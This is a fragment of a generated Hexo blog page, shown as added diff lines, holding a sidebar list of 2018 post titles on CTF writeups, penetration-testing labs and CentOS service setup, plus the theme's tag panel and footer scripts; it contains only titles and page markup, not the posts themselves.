+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2018/09/16/centos7%20django+uwsgi+nginx%E9%85%8D%E7%BD%AE/" >centos7 django+uwsgi+nginx配置</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2018/09/13/HITCON2017(babyfirst-revenge)%20writeup/" >HITCON2017(babyfirst-revenge) writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/centos%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%85/" >centos常见服务安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/%E5%8D%97%E9%82%AEctf/" >南邮ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/Docker%E7%9A%84%E5%A4%A7%E5%9D%91%E8%AE%B0%E5%BD%95/" >Docker的大坑记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/requests%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" >requests进行文件上传</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2018/08/12/%E6%B5%85%E8%B0%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%90%8E%E7%BC%80%E6%A3%80%E6%B5%8B/" >浅谈文件上传的后缀检测</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2018/08/03/sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A11(mysqli_real_escape_string)/" >sql注入与防御1(mysqli_real_escape_string)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/%E5%AE%89%E6%81%92%E6%9D%AF7%E6%9C%88/" >2018安恒杯7月</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" >远程命令注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2018/07/03/kali%E8%8E%B7%E5%8F%96%E6%8C%81%E7%BB%AD%E6%80%A7%E5%90%8E%E9%97%A8shell/" >kali获取持续性后门shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2018/07/02/ms17_010%E5%92%8Cms08-067%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" >ms17_010和ms08-067实验笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/27</span><a class="archive-post-title" href= "/2018/06/27/javascript%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E5%8F%98%E6%8D%A2/" >javascript实现图片变换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/20</span><a class="archive-post-title" href= "/2018/06/20/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0/" >php 文件上传漏洞之%00截断上传</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AE%20httpd/" >centos6.4配置 httpd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AEdns%E6%9C%8D%E5%8A%A1%E5%99%A8/" >centos6.4配置dns服务器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AEnfs/" >centos6.4配置nfs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AEsamba/" >centos6.4配置samba</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AEtelnet/" >centos6.4配置telnet</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/centos6.4%E9%85%8D%E7%BD%AEvpn/" >centos6.4配置vpn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/kali%E4%B8%8B%E7%9A%84wifi%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" >kali下的wifi渗透测试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/kali%E4%B8%8B%E7%9A%84wpscan%E7%A0%B4%E8%A7%A3wordpress/" >kali下的wpscan破解wordpress</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/windows%E5%92%8Clinux%E4%BA%92%E9%80%9A/" >windows和linux互通</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2018/06/17/%E5%AE%9E%E9%AA%8C%E5%90%A7web%E6%80%9D%E8%B7%AF/" >实验吧web思路</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="rubbish"><span class="iconfont-archer">&#xe606;</span>rubbish</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "iloveflag"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+</html>
+
+
